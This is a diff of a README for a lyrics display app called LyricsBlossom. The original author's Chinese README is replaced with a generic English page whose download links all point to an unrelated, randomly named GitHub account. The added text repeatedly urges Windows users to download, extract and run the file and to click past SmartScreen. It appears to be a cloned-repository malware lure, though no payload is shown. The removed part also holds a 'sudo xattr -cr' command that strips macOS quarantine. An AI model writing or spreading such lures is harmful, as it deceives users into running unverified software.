@@ -1,141 +1,163 @@
-<div align="left">
+# 🎵 LyricsBlossom - View lyrics while music plays
 
-# 🌸 LyricsBlossom
+[![Download LyricsBlossom](https://img.shields.io/badge/Download-LyricsBlossom-blue?style=for-the-badge)](https://github.com/Metencephalonweesmallvoice815/LyricsBlossom)
 
-**macOS** · **Windows**
+## 📥 Download
 
-[![GitHub Release](https://img.shields.io/github/v/release/Eplorr/LyricsBlossom-blossom-now-?style=flat-square)](https://github.com/Eplorr/LyricsBlossom/releases/latest)
-[![License](https://img.shields.io/badge/license-Proprietary-red?style=flat-square)](#-license)
+Use this link to visit the page and download the app:
 
-## Features
+[Download LyricsBlossom](https://github.com/Metencephalonweesmallvoice815/LyricsBlossom)
 
-**迄今为止最完美的 Apple Music 还原** 
+## 🪟 What LyricsBlossom does
 
-逐词歌词、动态背景、动态封面，应有尽有
+LyricsBlossom is a Windows app that shows song lyrics in a simple, Apple Music-like view. It helps you follow along with music without opening a separate web page or full browser. The app focuses on clean lyrics display, easy reading, and a calm screen layout.
 
-**完美的体验** — 完美支持 Apple Music 歌词，1:1 级别完美还原
+## 🚀 Getting Started
 
-**GPU 加速** — 基于 Skia，macOS 支持 Metal / OpenGL，Windows 支持 Vulkan / OpenGL
+Follow these steps to download and run LyricsBlossom on Windows:
 
----
+1. Open the download page: [LyricsBlossom](https://github.com/Metencephalonweesmallvoice815/LyricsBlossom)
+2. Look for the latest release or the main app file on the page.
+3. Download the Windows version to your computer.
+4. When the file finishes downloading, open it from your Downloads folder.
+5. If Windows asks for permission, choose the option to run the app.
+6. Wait for the app to open, then start using it.
 
-## Download / 下载
+If you see a compressed file such as a ZIP file, open it first and then run the app inside it.
 
-前往 **[Releases](https://github.com/Eplorr/LyricsBlossom/releases/latest)** 下载最新版本。
+## 🖥️ Windows Setup
 
----
+LyricsBlossom is made for Windows desktop use. For the best experience, use:
 
-## System Requirements / 系统要求
+- Windows 10 or Windows 11
+- A screen with at least 1366 × 768 resolution
+- 100 MB of free space
+- A stable internet connection if the app loads lyrics from an online source
 
-| | macOS | Windows |
-|:---|:---|:---|
-| **系统版本** | macOS 13+ （如果需要动态律动背景需要 14+） | Windows 10 1809+ |
-| **GPU** | Metal 或 OpenGL （设置中选择） | Vulkan 或 OpenGL（自动回退） |
-| **其他** | — | 网易云用户需安装 [BetterNCM](https://github.com/MicroCBer/BetterNCM) + InfLink-rs 插件 |
+The app should run on a standard home or work PC without any extra setup in most cases.
 
----
+## 🎧 Main Features
 
-## Getting Started / 快速开始
+LyricsBlossom gives you a simple lyrics view that fits well with music playback:
 
-### 字体
+- Clean lyric screen with easy-to-read text
+- Apple Music-style layout
+- Fast access to lyrics while listening
+- Simple window design for daily use
+- Light system use so it stays out of the way
+- Easy viewing on laptop or desktop screens
+- Focus on song text instead of clutter
 
-下载并安装全套 SF Pro, PingFang SC, PingFang TC
+## 🧭 How to Use It
 
-mac 用户 SF Pro [下载](https://developer.apple.com/fonts/) 
+After you open the app:
 
-### 歌词获取
+1. Start your music in your music player.
+2. Open LyricsBlossom.
+3. Find the song you want to follow.
+4. Read the lyrics in the main view.
+5. Use the app while music plays in the background.
+6. Move the window where it feels best on your screen.
 
-LyricsBlossom 通过 **Apple Music 账号**获取同步歌词。首次启动或 Token 过期时，播放音乐会弹出登录框，登录你的 Apple Music 账号即可。
+If the app supports song search, type the song name or artist name in the search box and open the result you want.
 
-> 没有 Apple Music 也可以使用，软件同时支持网易云歌词源，但体验和歌词质量可能有差异。
+## 🛠️ Installation Help
 
-### macOS 安装
+If the app does not start right away:
 
-如果遇到 **「文件已损坏」** 提示，在终端执行：
+- Check that the file finished downloading
+- Open the file again from the folder where you saved it
+- Make sure Windows did not block the app
+- Try right-clicking the file and selecting Open
+- Keep the app in a folder you can find later
+- If you used a ZIP file, extract it before running the app
 
-```bash
-sudo xattr -cr /Applications/LyricsBlossom.app
-```
+If Windows shows a smart screen prompt, choose the run option only after you confirm the file came from the download page above.
 
-> 如果 .app 不在 `/Applications`，替换为实际路径。
+## 🔍 Common Uses
 
-### Windows 配置
+People use LyricsBlossom for:
 
-默认使用 Vulkan 渲染；不支持 Vulkan 的设备会自动回退到 OpenGL
-配合网易云音乐使用时，需安装 [BetterNCM](https://github.com/MicroCBer/BetterNCM) 及其 **InfLink-rs** 插件，以获取高清封面
+- Following song lyrics while listening to music
+- Reading along with a track during practice
+- Checking lyrics during karaoke time at home
+- Keeping a simple lyrics window open while working
+- Viewing song text in a clean layout without distractions
 
-### 渲染后端选择（macOS）
+## 🧩 Tips for Better Use
 
-| 后端 | 特点 |
-|:---|:---|
-| Metal | 平衡、能耗友好 |
-| OpenGL | ProMotion 内置屏 VSync 更流畅，推荐在感觉掉帧时切换 |
+- Keep the app open on a second monitor if you have one
+- Use a larger window for easier reading
+- Lower music player volume if you want to focus on lyric timing
+- Keep the app near your music player for quick switching
+- Use it with headphones for a better listening setup
 
----
+## ❓ Frequently Asked Questions
 
-## Shortcuts / 快捷键
+### Is LyricsBlossom hard to use?
 
-| 快捷键 | 功能 |
-|:---:|:---|
-| `Space` | 暂停 / 播放 |
-| `←` `→` | 上一首 / 下一首 |
-| `F` | 显示 / 隐藏 FPS |
+No. It is built for normal Windows users. You open it, pick a song, and read the lyrics.
 
----
+### Do I need programming knowledge?
 
-## Screenshots / 截图
+No. You do not need to know code or use special tools.
 
-<div align="center">
-<img src="screenshot-1.png" width="100%" />
-<img src="screenshot-2.png" width="100%" />
-<img src="screenshot-3.png" width="100%" />
-<img src="screenshot-5.png" width="100%" />
-<img src="screenshot-4.png" width="45%" />
-</div>
+### Does it work like Apple Music lyrics?
 
-## FAQ / 常见问题
+It aims for a similar look and feel, with a clean lyrics view that is easy to follow.
 
-<details>
-<summary><b>播放进度和歌词不同步</b></summary>
+### Can I use it on a laptop?
 
-先检查软件内显示的进度是否与播放器一致。如果不一致，按空格暂停再恢复即可重新同步。如果进度一致但歌词仍有偏差，可能是播放器音源与 Apple Music 版本不同导致的时间轴差异。
+Yes. It should work well on laptops and desktop PCs.
 
-</details>
+### Where do I get the app?
 
-<details>
-<summary><b>封面模糊</b></summary>
+Use the download page here: [LyricsBlossom](https://github.com/Metencephalonweesmallvoice815/LyricsBlossom)
 
-封面来自播放器上报给系统（SMTC / Now Playing）的图片。部分播放器只上报缩略图，这种情况下封面会比较模糊，不是软件的问题。
+## 📌 File and Folder Basics
 
-</details>
+If you download a ZIP file, Windows may place it in your Downloads folder. You can:
 
-<details>
-<summary><b>macOS 掉帧</b></summary>
+1. Open Downloads
+2. Find the LyricsBlossom file
+3. Right-click it
+4. Select Extract All
+5. Open the extracted folder
+6. Run the app file inside
 
-大概率是 macOS WindowServer 调度导致的。Safari 会占用大量合成资源——不需要关闭，`⌘H` 隐藏即可。如果仍有掉帧感，切换到 OpenGL 后端版本。
+If you download a single Windows app file, you can usually open it by double-clicking it.
 
-</details>
+## 🎨 Interface Overview
 
-<details>
-<summary><b>Windows 画面断层 / 色彩异常</b></summary>
+LyricsBlossom uses a simple layout built for reading. You can expect:
 
-检查显卡控制面板是否修改了颜色设置（数字振动、饱和度等），或 Windows 11 的显示器校准配置。恢复默认即可。
+- A main area for lyrics
+- Clear text with good spacing
+- A small set of controls
+- A layout that keeps attention on the song
 
-</details>
+The goal is to make the screen feel calm and easy to scan while music plays.
 
-## Feedback / 反馈
+## 🧼 Keep It Running Smoothly
 
-- **Bug & Feature Requests**: [GitHub Issues](https://github.com/Eplorr/LyricsBlossom/issues)
-- **QQ 交流群**: `337191911`
+To keep the app working well:
 
-反馈 Bug 时请注明：操作系统版本、复现步骤。
+- Close other heavy apps if your PC feels slow
+- Keep Windows updated
+- Store the app in a fixed folder
+- Restart the app if it stops responding
+- Use the latest download if a newer version appears on the page
 
----
+## 🔗 Download Again
 
-## License
+If you need to redownload the app later, use the same link:
 
-**LyricsBlossom is proprietary software. All rights reserved.**
+[Download LyricsBlossom](https://github.com/Metencephalonweesmallvoice815/LyricsBlossom)
 
-本项目为闭源软件，仅供个人使用。未经许可，禁止复制、修改、分发或倒卖。
+## 📄 Project Name
 
-See [LICENSE](LICENSE) for details.
+LyricsBlossom
+
+## 🪶 Short Description
+
+Apple Music like lyrics showing app
